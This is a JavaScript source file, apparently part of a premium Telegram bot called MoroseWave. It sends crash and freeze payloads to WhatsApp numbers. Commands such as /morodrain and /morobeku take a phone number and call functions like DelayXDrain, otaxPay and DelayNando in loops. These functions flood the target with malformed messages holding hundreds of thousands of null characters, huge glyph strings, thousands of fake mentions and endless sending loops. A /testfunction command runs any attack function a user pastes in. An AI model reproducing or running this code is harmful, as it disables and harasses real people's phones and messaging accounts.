</code></pre>`;

    const keyboard = getMenuTqto(warna);

    try {
        await ctx.editMessageCaption(controlsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

// ======================
// MENU INFORMATION (PAGE 6/6)
// ======================
bot.action('menu_information', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';

    const informationMenu = `
<pre><code class="language-javascript">
[ INFORMATION | v24.0 G2 ]

  Selamat Hari Raya Idul Adha 1446 H
  Semoga berkah dan kebahagiaan menyertai kita semua.
  Taqabbalallahu minna wa minkum.

[ PAGE 6/6 ]
</code></pre>`;

    const keyboard = getMenuInformation(warna);

    try {
        await ctx.editMessageCaption(informationMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});
// COMMAND BUG

bot.command("tryfunk", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /moroforce 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 35; i++) {
    await DelayNando(sock, target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("moroscreen", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /moroscreen 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await sendAllMessages(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("morobeku", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /morobeku 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await otaxPay(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("moroinvis", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /moroinvis 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await DelayXDrain(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("morodrain", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /morodrain 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await DelayXDrain(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("morospam", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /morospam 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await DelayXDrain(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("morobuldo", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /morobuldo 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await DelayXDrain(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v24.0 G2 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

//END CASE BUG BEBAS SPAM
bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</code></pre>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// FUNCTION BUG
//delay
async function DelayXDrain(sock, target) {
  const Nanas = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: "17381601",
          title: "moro ",
          fileName: " ah ah ange " + "ꦽ".repeat(50000),
          fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
          directPath: "/v/t62.7119-24/fake.enc",
          mediaKeyTimestamp: "1767975195",
          url: "https://mmg.whatsapp.net/d/fake.enc",
          caption: "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        }
      }
    }
  };

  const Muda = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: " moro " + "ꦾ".repeat(99999)
          },
          contextInfo: {
            stanzaId: "metawai_id",
            forwardingScore: 999,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, () => 
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", Nanas, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  await sock.relayMessage("status@broadcast", Muda, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  const startTime = Date.now();
  const duration = 1 * 60 * 1000; // 1 menit
  
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(500000),
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1950 },
                  () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ]
            }
          }
        }
      }
    }, { participant: { jid: target } });
  }
}
//fc no click
async function DelayNando(sock, target) {
  const startTime = Date.now();
  const duration = 2 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "LexzyModss - Executed",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "",
              version: 3
            },
            contextInfo: {
              remoteJid: Math.random().toString(36) + "\u0000".repeat(75000),
              isForwarded: true,
              forwardingScore: 9999,
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 8500000 }, (_, n) => ({
                  participant: `62${n + 720599}@s.whatsapp.net`
                }))
              },
            },
          },
        },
      },
    }, { participant: { jid: target } });
  }

  const LexMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        eventMessage: {
          isCanceled: true,
          name: "jepang",
          description: "\u0000",
          location: {
            degreesLatitude: "a",
            degreesLongitude: "a",
            name: "X"
          },
          joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
          startTime: "1714957200",
          thumbnailDirectPath: "https://files.catbox.moe/a4uo15.jpg",
          thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
          thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
          mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
          mediaKeyTimestamp: Date.now(),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 85000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "target",
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "\u0000",
                      format: "DEFAULT",
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "\×10",
                      version: 3,
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, LexMsg, {
    messageId: "",
    participant: { jid: target },
    userJid: null
  });
}
//delay bebas spam
async function annotationz(target) {
  for (let z = 0; z < 100; z++) {
    await WaSocket.relayMessage("status@broadcast", {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "dy6rjLbf2Zdmt1V3y15X1WYHEsUXS1DUh4G6yV3fM2I=",
        fileLength: "3557776",
        seconds: 19,
        mediaKey: "QOhY9TSI4bfSBp0Bzj80QyW5EYJ6OQL4Ak3pjb1vUMM=",
        height: 480,
        width: 480,
        fileEncSha256: "g7ZxEPo0YUaHnEYkFfu8BvMh6g4Ib/Y7IzkJFEdZyW0=",
        directPath: "/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1779806852",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAABBQEAAAAAAAAAAAAAAAAAAQIDBAUGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAyljXsWcs6SHnV187CNqPOaKTLlsSMLm5znQzZrVqqY+c2+fqriMG7WzmumbuW5oSzka2RLJlddB0tzIDC/Lkvpuuzsi5yrr8tr4iu+zSk7QCEtOgctXzBRK9cKZsodMwDmb/xAAqEAACAgIBAwEIAwEAAAAAAAABAgADBBESISIxQQUQEzJRYXFyFBUjUv/aAAgBAQABPwBah2AHyu4UIXlFqVgDv0hx+zkYKmJYD0nwW0p35iU9xDQVNsiGp+Ji2ntP0GozdugOk9m0/HbTeBL/AGcjdEcifwL6w2tNHrtQAPWeka5/xBd27I7tw3kKCPMrVDUp49d6gp2T11PZKBC3WCMUgCWfeZOHjlGYoJqvR6S8IF7Zj4WU1KlU6GHBzvRJhC/Gv42KRN7ENYaW5dWKwQzMzkej/Mzmw3HYsswzrFo/WGMuwSQDDfYjgfMCY9/DXMamUitkByCymf1r2hmB4j0Eet62KspBmtI0x7QKcf8AWZWWETYgzLLU7FJnwSnDl5MekFQzHosbKWq3cqvruXaP+ZmpTbSeeg3pG6K0qyuxB9BEsW26sOem499dY7dCPkcrVPoDMm7VQ6bU+Zf3WEgECVWvUwKmWX2WNyc7Mb5WieBOWvED2MNlvEoWy5WYAaWZFhqq7bPPpGZnO2PuBjghTBivwU+diGhxrpHQrX9pTZwxbhvzAA9Tf9CFWHke6sgHZjMvB/vP/8QAIxEAAgICAQIHAAAAAAAAAAAAAQIAEQMhEgQxEBMiMkFRcf/aAAgBAgEBPwBSwAjOQauByZbzLdi5evdHG/BLq7mXXGcTGtVu4uRiF9MViNTN3E4jj3mYGigH7OlVtmrrU4/JmYglZ5rXEJNkxHKlR9wiwRMooif/xAAeEQACAwABBQAAAAAAAAAAAAAAAQIQERIDITJRkf/aAAgBAwEBPwASMpUqYqlqzPZ1JuMkkqRpJyfiSXc0RwXFs4qKRm/BkVh//9k=",
        contextInfo: {
          pairedMediaType: 4,
          statusSourceType: 0
        },
        annotations: Array.from({ length: 70000 }, () => (
          {
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                author: "\0"
              }
            },
            embeddedAction: true
          }
        )),
        streamingSidecar: "MDcl6QckPwTKM0jEIiaPbRaSSbDMmA7O1wkWQkvHDYRBmhmYe9jxEwk662ZOB0jXrPTvvLE24YQDyHu8zHLq6wz3ithLB2EmFYk+jLqBMAzo4BgZEqLJWMGndenNtdS4H582vlYolVbg9bqUwFm7be2Da/7GxjMrQKP6Ly5f0opOnH0PV+aNPbp2KE9T/hhsMJXscHbg9nxILoRYAWyQV8u72z6fnBwe5PtZrXU48kgwNMFkQRyEvdESdTHxIH/+MntMQ6MFA/G7beOb86iHeADITkXWENvib/bKKd9I09y4Z1Jf+Z9RMnuMq0DePvTXAs3rq2amO94EYtxc9D7TNu1bEYIH8sAtEkjlemYv0nccM54G5KBZF4Li/eywEq5+ri2NVV+6gw2WT6NGrUQ23aGKhyk2d9xeRhxlOeHpDEp1MzFsqrM7bm3k6IQ86YlBoZZrf//IlwMxR8GLaBTPLsGrrVSgF+g0E/HNOkiHxtLB5FxZ04oFOkqD54D9c2+PsoLaHEL0n6SUkh2R4ntE6s3mi6CgNWnWva4K2q61kB9yPg6tsxI26JdxC0fUrVScBXNEmXTZFweTPIgMi3k3eZRkW3I/6ePeRz8pZhzDHo7flhHXxlYfy8hezzpGniX+8VgxUWbflPqJBKTvQ5lJDJxOdgKf/tIotDEws3UcEY3nBumVENqXBudHgL+HimM6bD0187E3IB7OwvsR78IYzh0K7l7Xtw=="
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    })
  }
}
//blank
async function sendAllMessages(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "MakLo"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: {
                value: 999999999999,
                offset: 100
              },
              reference_id: "\u0000".repeat(5000),
              order: {
                status: "pending",
                items: [
                  {
                    name: "𑇂𑆵𑆴𑆿".repeat(9999),
                    amount: { value: 100000, offset: 100 },
                    quantity: 99999
                  }
                ]
              }
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(75000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(9000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}
//beku
async function otaxPay(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "moro⸙"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: {
                value: 999999999999,
                offset: 100
              },
              reference_id: "\u0000".repeat(5000),
              order: {
                status: "pending",
                items: [
                  {
                    name: "𑇂𑆵𑆴𑆿".repeat(9999),
                    amount: { value: 100000, offset: 100 },
                    quantity: 99999
                  }
                ]
              }
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(75000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"moro","key":"${'\u0000'.repeat(9000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "moro⸙",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"otax","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}
//function tes
async function ThisOne(sock, target, mention = false) {

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

while (true) {

  var msg = {
    groupStatusMessageV2: {
      message: {
        buttonsResponseMessage: {
          selectedButtonId: "\u0000".repeat(475555),
          selectedDisplayText: "\u0000".repeat(475555),
          type: 1,
          contextInfo: {
            entryPointConversionSource: "booking_status",
            forwardedAiBotMessageInfo: { botJid: "ABC@bot" },
            forwardOrigin: 4,
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true,
            paymentExtendedMetadata: {
              type: 1,
              platform: "windowshortcut"
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target
            },
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
          },
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            messageAssociation: {
              associationType: 7,
              parentMessageKey: crypto.randomBytes(16)
            }
          }
        }
      }
    }
  }

  await sock.relayMessage(
    target,
    msg,
    mention
      ? {
          participant: { jid: target }
        }
      : {}
  );

  await delay(1000);
}
}
// END FUNCTION BUG


bot.launch()
